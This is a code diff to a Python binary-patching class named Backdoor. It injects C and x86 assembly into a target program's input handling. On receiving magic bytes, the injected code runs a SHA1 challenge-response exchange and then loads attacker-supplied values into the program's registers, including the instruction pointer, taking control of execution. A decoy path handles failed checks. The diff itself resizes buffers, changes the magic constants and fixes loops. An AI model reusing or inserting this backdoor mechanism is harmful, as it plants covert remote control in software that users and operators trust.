@@ -20,73 +20,82 @@ class Backdoor(object):
 
     def get_c_patch(self):
         code = '''
-        // right now, this is compiled to 268 bytes with -Oz
-        #define K1 0x5A827999
-        #define K2 0x6ED9EBA1
-        #define K3 0x8F1BBCDC
-        #define K4 0xCA62C1D6
-        //TODO it seems this is not used by final compiled code (but it is still present in the compiled code)
-        // find a way to tell clang to remove it
-        int ROTATE_LEFT(const int value, int shift) {
-            unsigned int uvalue = (unsigned int)value;
-            return (uvalue << shift) | (uvalue >> (32- shift));
-        }
-        // Update HASH[] by processing a one 64-byte block in MESSAGE[]
-        __attribute__((__fastcall)) int SHA1(int MESSAGE[] )
-        {
-          // these arrays are not necessary but used to better highlight dependencies
-          int B, C, D, E;
-          int A,An;
-          int K;
-          int W[80];
-          int FN;
-          int i;
+// right now, this is compiled to 268 bytes with -Oz
 
-          A = 0x67452301;
-          B = 0x98BADCFE;
-          C = 0xEFCDAB89;
-          D = 0x10325476;
-          E = 0xC3D2E1F0;
-          for ( i=0; i<80; ++i ){
-            if ( i < 16 ){
-              W[i] = MESSAGE[i];
-            }else{
-              W[i] = ROTATE_LEFT( W[i-3] ^ W[i-8] ^ W[i-14] ^ W[i-16], 1 );
-            }
+#define K1 0x5A827999
+#define K2 0x6ED9EBA1
+#define K3 0x8F1BBCDC
+#define K4 0xCA62C1D6
 
-            if(i<20){
-              K = K1;
-              FN = (D ^ ( B & (C ^ D)));
-            }else if(i<40){
-              K = K2;
-              FN =  (D ^ B ^ C);
-            }else if(i<60){
-              K = K3;
-              FN = (B & C) | (D & (B ^ C));
-            }else{
-              K = K4;
-              FN = (D ^ B ^ C);
-            }
+__attribute__((__fastcall)) int SHA1(int MESSAGE[] )
+{
+  // __asm("int $3");
+  // these arrays are not necessary but used to better highlight dependencies
+  int B, C, D, E;
+  int A,An;
+  int K;
+  int W[80];
+  int FN;
+  int i;
 
-            An = FN + E + ROTATE_LEFT( A, 5 ) + W[i] + K;
-            E = D;
-            D = C;
-            C = ROTATE_LEFT( B, 30 );
-            A = An;
-            B = A;
-          }
-          return (0x67452301 + A);
-        }
+  A = 0x67452301;
+  B = 0x98BADCFE;
+  C = 0xEFCDAB89;
+  D = 0x10325476;
+  E = 0xC3D2E1F0;
+
+  for ( i=0; i<80; ++i ){
+    if ( i < 16 ){
+      // reverse the order of bytes on little-endian
+      W[i] = MESSAGE[i];
+    }else{
+      W[i] = ROTATE_LEFT( W[i-3] ^ W[i-8] ^ W[i-14] ^ W[i-16], 1 );
+    }
+
+
+    if(i<20){
+      K = K1;
+      FN = (D ^ ( B & (C ^ D)));
+    }else if(i<40){
+      K = K2;
+      FN =  (D ^ B ^ C);
+    }else if(i<60){
+      K = K3;
+      FN = (B & C) | (D & (B ^ C));
+    }else{
+      K = K4;
+      FN = (D ^ B ^ C);
+    }
+
+    An = FN + E + ROTATE_LEFT( A, 5 ) + W[i] + K;
+
+    E = D;
+    D = C;
+    C = ROTATE_LEFT( B, 30 );
+    B = A;
+    A = An;
+
+  }
+
+  return (0x67452301 + A);
+}
+
+//TODO it seems this is not used by final compiled code (but it is still present in the compiled code)
+// find a way to tell clang to remove it
+int ROTATE_LEFT(const int value, int shift) {
+    unsigned int uvalue = (unsigned int)value;
+    return (uvalue << shift) | (uvalue >> (32- shift));
+}
         '''
-        return AddCodePatch(code,"sha1_block",is_c=True,optimization="-Oz")
+        return AddCodePatch(code,"sha1_block",is_c=True,optimization="-O0")
 
     def compute_patches(self,victim_addr):
         patches = []
-        patches.append(AddRWDataPatch(4,"random_value"))
+        patches.append(AddRWDataPatch(8,"random_value")) #rnd value and delimiter
         patches.append(AddRWDataPatch(4,"nbytes"))
         patches.append(AddRWDataPatch(4,"backdoor_receive_buffer"))
         patches.append(AddRWDataPatch(1,"backdoor_receive_len"))
-        patches.append(AddRWDataPatch(13,"backdoor_response_buffer"))
+        patches.append(AddRWDataPatch(16,"backdoor_response_buffer"))
         patches.append(self.get_c_patch())
         code = '''
             ; get 4 rnd value retrying in the unlikely case, in which rnd failed
@@ -114,14 +123,13 @@ class Backdoor(object):
             ; get 4 rnd value retrying in the unlikely case, in which rnd failed
             xor edi, edi 
             _receive_loop:
-                cmp edi, 13
+                cmp edi, 16
                 je _receive_exit
-                xor ebx, ebx
-                inc ebx
+                xor ebx, ebx ; stdin
                 mov ecx, {backdoor_response_buffer}
                 add ecx, edi
                 xor edx, edx
-                mov dl, 13
+                mov dl, 16
                 sub edx, edi
                 mov esi, {nbytes}
                 xor eax, eax
@@ -134,7 +142,7 @@ class Backdoor(object):
             _receive_exit:
                 ret
         '''
-        patches.append(AddCodePatch(code,name="receive_13"))
+        patches.append(AddCodePatch(code,name="receive_16"))
 
         code = '''
             ; fast path: this code is added to every receive
@@ -142,7 +150,7 @@ class Backdoor(object):
             jae _exit_backdoor
 
             ; this code is executed at most 4 times unless receive failed
-            ; esi, edx, ecx, ebx are free
+            ; esi, edx, ecx, ebx are free because we are in a syscall wrapper restoring them
             test eax, eax ; test if receive succeeded
             jne _exit_backdoor
             test ebx, ebx ; test if ebx is 0 (stdin)
@@ -175,9 +183,9 @@ class Backdoor(object):
 
             _backdoor_entry_check:
                 ; what we have to send from the pov has inverted endiannes! (0x9067b180 and 0x9067b181)
-                cmp DWORD[{backdoor_receive_buffer}], 0x80b16790
+                cmp DWORD[{backdoor_receive_buffer}], 0x80b16733
                 je _real_backdoor
-                cmp DWORD[{backdoor_receive_buffer}], 0x81b16790
+                cmp DWORD[{backdoor_receive_buffer}], 0x81b16733
                 je _fake_backdor
                 jmp _exit_backdoor
 
@@ -187,24 +195,32 @@ class Backdoor(object):
             ; so that an attacker cannot use push <code>, push esp without actually executing the backdoor code
             _real_backdoor:
                 sub esp, 64 ; space for sha1 MESSAGE
-                push 0xc35b5990 ; pop ecx, pop ebx, ret, nop: pop ecx is used to clean [esp] from the stack
+                push 0xc35b5990 ; nop, pop ecx, pop ebx, ret: pop ecx is used to clean [esp] from the stack
                 push esp
                 call {get_4_rnd}
                 
+                ; mov DWORD [{random_value}], 0x0006a87b ; uncomment for debug
                 mov eax, DWORD [{random_value}]
-                and eax, 0x7ffff 
+                ; jmp eax ; uncomment for debug
+                and eax, 0x7ffff ; the challenge goes from0 to 0x7ffff, 19 bits, 0.5M possibilities
                 mov DWORD [{random_value}], eax
-                ; random_value is now the challenge (a value between 0 and 0x7ffff, 0.5M possibilities)
+                ; random_value is now the challenge
 
-                ; send the challenge value
+                ;add delimiter to random_value
+                mov eax, DWORD {random_value}
+                add eax, 4
+                mov DWORD [eax], 0xbaccd004
+
+                ; send the challenge value plus the delimiter
                 xor edi, edi
                 _trasmit_loop:
-                    cmp edi, 4
+                    cmp edi, 8
                     je _trasmit_exit
-                    xor ebx, ebx ; stdout
+                    xor ebx, ebx
+                    inc ebx ; stdout 
                     mov ecx, {random_value}
                     xor edx, edx
-                    mov dl, 4
+                    mov dl, 8
                     mov esi, {nbytes}
                     xor eax, eax
                     mov al, 2
@@ -213,67 +229,69 @@ class Backdoor(object):
                     jmp _trasmit_loop
                 _trasmit_exit:
 
-                call {receive_13}
-                ; backdoor_response_buffer is: challenge_response (5), ebx (4), eip (4)
-                ; copy the challenge response on the stack where created space for sha1 input buffer
+                call {receive_16}
+                ; backdoor_response_buffer is: challenge_response (8), ebx (4), eip (4)
+                ; copy the challenge response on the stack where space has been created for sha1 MESSAGE
                 xor ecx, ecx
-                _copy_response_loop:
-                    cmp cl, 5
+                _copy_response_loop1:
+                    cmp cl, 8
                     je _copy_response_exit
                     mov bl, BYTE [{backdoor_response_buffer}+ecx]
                     mov BYTE[esp+8+ecx], bl
                     inc cl
-                    jmp _copy_response_exit
+                    jmp _copy_response_loop1
                 _copy_response_exit:
 
                 ; call sha1 passing the buffer on the stack as arg
                 mov ecx, esp
                 add ecx, 8
-                %s
+                call {sha1_block}
                 ; now we have the result in eax
                 cmp eax, DWORD [{random_value}] ; this is the challenge/response check!
-                ; note that the check is actually checking 32 bits, out of which 19 are not zero
+                ; note that the check is actually checking 32 bits, out of which 13 (32-19) are always zero
                 jne _fake_backdor ; check failed, just send the execution to a bad place
 
                 ; now copy the transmitted ebx and eip
                 xor ecx, ecx
                 xor edx, edx
-                mov cl, 5
+                mov cl, 8
                 _copy_response_loop2:
-                    cmp cl, 13
-                    je _copy_response_exit
+                    cmp cl, 16
+                    je _copy_response_exit2
                     mov bl, BYTE [{backdoor_response_buffer}+ecx]
                     mov BYTE[esp+8+edx], bl
                     inc cl
                     inc edx
-                    jmp _copy_response_exit2
+                    jmp _copy_response_loop2
                 _copy_response_exit2:
 
                 ; magically ret will jump to the stack, executing pop, pop, ret (setting ebx, eip to the sent values)
                 ret
 
             _fake_backdor:
-            ;   ; set the stack as in the real backdoor
+                ; set the stack as in the real backdoor
                 push 0xc35b5990 ; pop ecx, pop ebx, ret, nop: pop ecx is used to clean [esp] from the stack
                 push esp
                 call {get_4_rnd}
-                call {receive_13}
+                call {receive_16}
 
-                ; copy 8 bytes from the received ones, to the stack but xor them with random_value to make this fail
-                mov edx, DWORD [{backdoor_response_buffer}]
-                xor edx, DWORD [{random_value}]
-                mov DWORD [esp+8], edx
+                ; now copy the transmitted ebx and eip
                 xor ecx, ecx
-                mov cl, 4
-                mov edx, DWORD [{backdoor_response_buffer}+ecx]
-                xor edx, DWORD [{random_value}]
-                mov DWORD [esp+12], edx
-
+                ; int 3
+                _copy_response_loop3:
+                    cmp cl, 16
+                    je _copy_response_exit3
+                    mov ebx, DWORD [{backdoor_response_buffer}+ecx]
+                    xor ebx, DWORD [{random_value}]
+                    mov DWORD[esp+8+ecx], ebx
+                    add cl, 4
+                    jmp _copy_response_loop3
+                _copy_response_exit3:
                 ; will start executing the stack but the gadget will use random data (so ebx and eip are random)
                 ret
 
             _exit_backdoor:
-        '''%utils.get_nasm_c_wrapper_code("sha1_block",get_return=True,debug=False)
+        '''
         patches.append(InsertCodePatch(victim_addr,code,name="backdoor_receive_checker",priority=200))
         return patches
 
